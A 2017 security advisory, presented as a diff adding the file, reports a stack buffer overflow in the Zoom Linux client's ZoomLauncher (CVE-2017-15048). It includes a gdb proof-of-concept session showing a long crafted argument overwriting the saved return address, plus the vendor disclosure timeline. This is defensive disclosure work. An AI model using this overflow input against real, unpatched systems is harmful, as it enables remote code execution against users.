@@ -1,0 +1,113 @@
+[CONVISO-17-002] - Zoom Linux Client Stack-based Buffer Overflow Vulnerability
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-17-002
+    CVE ID: CVE-2017-15048
+    CVSS v2: 6.8, (AV:N/AC:M/Au:N/C:P/I:P/A:P)
+    Date: 2017-10-01
+
+2. Affected Components
+    Zoom client for Linux, version 2.0.106600.0904 (zoom_amd64.deb). Other versions may be
+    vulnerable.
+
+3. Description
+    The binary /opt/zoom/ZoomLauncher is vulnerable to a buffer overflow because it concatenates a
+    overly long user input to a stack variable without checking if the destination buffer is long
+    enough to hold the data.
+    The binary also has important security features like canary turned off.
+    The client registers a scheme handler (zoommtg://) and this makes possible to trigger the
+    vulnerability remotely.
+
+4. Details
+    gef>  checksec
+    [+] checksec for '/opt/zoom/ZoomLauncher'
+    Canary                        : No
+    NX                            : Yes
+    PIE                           : No
+    Fortify                       : No
+    RelRO                         : Partial
+    gef>
+
+    gef>  r $(python -c 'print "A"*1048 + "BBBBBBBB"')
+    Starting program: /opt/zoom/ZoomLauncher $(python -c 'print "A"*1048 + "BBBBBBBB"')
+    ZoomLauncher started.
+
+    Breakpoint 4, 0x00000000004025a6 in main ()
+    gef>  x/5i $pc
+    => 0x4025a6 <main+367>: call   0x4010f0 <strcat@plt>
+       0x4025ab <main+372>: lea    rax,[rbp-0x410]
+       0x4025b2 <main+379>: mov    rcx,0xffffffffffffffff
+       0x4025b9 <main+386>: mov    rdx,rax
+       0x4025bc <main+389>: mov    eax,0x0
+    gef>  x/s $rdi
+    0x7fffffffd330: ""
+    gef>  x/s $rsi
+    0x7fffffffdc35: 'A' <repeats 1048 times>, "BBBBBBBB"
+    gef>  i f
+    Stack level 0, frame at 0x7fffffffd750:
+     rip = 0x4025a6 in main; saved rip = 0x7ffff7216f45
+     Arglist at 0x7fffffffd740, args:
+     Locals at 0x7fffffffd740, Previous frame's sp is 0x7fffffffd750
+     Saved registers:
+      rbp at 0x7fffffffd740, rip at 0x7fffffffd748
+    gef>  ni
+    0x00000000004025ab in main ()
+    gef>  i f
+    Stack level 0, frame at 0x7fffffffd750:
+     rip = 0x4025ab in main; saved rip = 0x4242424242424242
+     Arglist at 0x7fffffffd740, args:
+     Locals at 0x7fffffffd740, Previous frame's sp is 0x7fffffffd750
+     Saved registers:
+      rbp at 0x7fffffffd740, rip at 0x7fffffffd748
+    gef>
+
+5. Solution
+    Upgrade to latest version.
+
+6. Credits
+    Ricardo Silva <rsilva@conviso.com.br>
+    Gabriel Quadros <gquadros@conviso.com.br>
+
+7. Report Timeline
+    Set 28, 2017 - Conviso sent first email asking for a channel to discuss the vulnerability.
+    Set 28, 2017 - Vendor asked the report in the current channel.
+    Set 28, 2017 - Conviso sent informations to reproduce the vulnerability.
+    Set 28, 2017 - Conviso asked if they could reproduce it.
+    Set 28, 2017 - Vendor replied saying that the informations were forwarded to engineering team.
+    Oct  5, 2017 - Vendor provided a patch candidate for testing.
+    Oct  5, 2017 - Conviso pointed problems in the patch.
+    Oct 11, 2017 - Vendor provided a patch candidate for testing.
+    Oct 12, 2017 - Conviso pointed problems in the patch.
+    Oct 23, 2017 - Conviso asked for status.
+    Oct 27, 2017 - Conviso asked for status.
+    Nov  1, 2017 - Conviso asked for status.
+    Nov  3, 2017 - Vendor replied.
+    Nov  6, 2017 - Conviso asked for status.
+    Nov  6, 2017 - Vendor replied.
+    Nov  9, 2017 - Conviso asked for status.
+    Nov 13, 2017 - Conviso asked for status.
+    Nov 15, 2017 - Conviso asked for status.
+    Nov 16, 2017 - Vendor provided a patch candidate for testing.
+    Nov 16, 2017 - The patch seems to fix the attack vector, although no further research was done.
+    Nov 20, 2017 - Vendor thanked and marked the issue as solved, considering the patch as a
+    sastifactory fix.
+    Nov 30, 2017 - Vendor released the version 2.0.115900.1201
+
+8. References
+    https://zoom.us/download
+    https://support.zoom.us/hc/en-us/articles/205759689-New-Updates-for-Linux
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2017 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
